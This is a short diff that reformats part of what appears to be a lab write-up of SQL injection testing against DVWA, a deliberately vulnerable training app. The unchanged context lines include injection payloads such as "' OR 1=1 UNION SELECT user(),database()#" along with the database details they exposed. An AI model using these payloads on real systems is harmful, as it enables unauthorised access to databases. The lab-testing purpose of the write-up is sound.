@@ -73,7 +73,7 @@ Input: 1' OR '1'='1
 Result: SQL syntax error revealed
 
 Observation: Application is vulnerable to SQLi
-             Database type exposed: MariaDB
+- Database type exposed: MariaDB
 
 
 ### Step 3 — Boolean Based SQLi
@@ -91,8 +91,8 @@ Observation: No input sanitization — full DB dump possible
 Input: ' OR 1=1 UNION SELECT user(),database()#
 
 Result: Database credentials exposed
-        DB User: app@localhost
-        DB Name: dvwa
+- DB User: app@localhost
+- DB Name: dvwa
 
 Observation: Critical database information extracted
 
